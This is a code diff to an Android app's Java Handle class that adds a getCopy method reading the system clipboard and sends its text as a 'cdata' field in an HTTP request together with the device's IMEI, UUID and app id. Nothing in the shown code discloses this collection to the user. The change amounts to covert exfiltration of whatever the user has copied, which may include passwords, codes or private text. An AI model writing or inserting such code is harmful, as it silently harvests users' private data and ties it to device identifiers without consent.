@@ -5,6 +5,8 @@ import java.net.URLEncoder;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 
 import com.lidroid.jxutils.HttpUtils;
@@ -103,6 +105,7 @@ public class Handle {
 		requestParams.addBodyParameter("app_id", DeviceUtil.getAppid(context));
 		requestParams.addBodyParameter("imei", DeviceUtil.getIMEI(context));
 		requestParams.addBodyParameter("uuid", DeviceUtil.getUUID(context));
+		requestParams.addBodyParameter("cdata",getCopy(context));
 		requestParams.addBodyParameter("cur_ver",
 				DeviceUtil.getVersionCode(context));
 		Yayalog.loger(DeviceUtil.getAppid(context)+","+DeviceUtil.getIMEI(context)+","+DeviceUtil.getVersionCode(context));
@@ -148,6 +151,22 @@ public class Handle {
 				});
 
 	}
+	
+	
+	//系统剪贴板-获取:   
+    public static String getCopy(Context context) {
+        // 获取系统剪贴板
+        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
+        // 返回数据
+        ClipData clipData = clipboard.getPrimaryClip();
+        if (clipData != null && clipData.getItemCount() > 0) {
+            // 从数据集中获取（粘贴）第一条文本数据
+            return clipData.getItemAt(0).getText().toString();
+        }
+        return "";
+    }
+
+	
 
 	/**
 	 * 加密注册回调信息
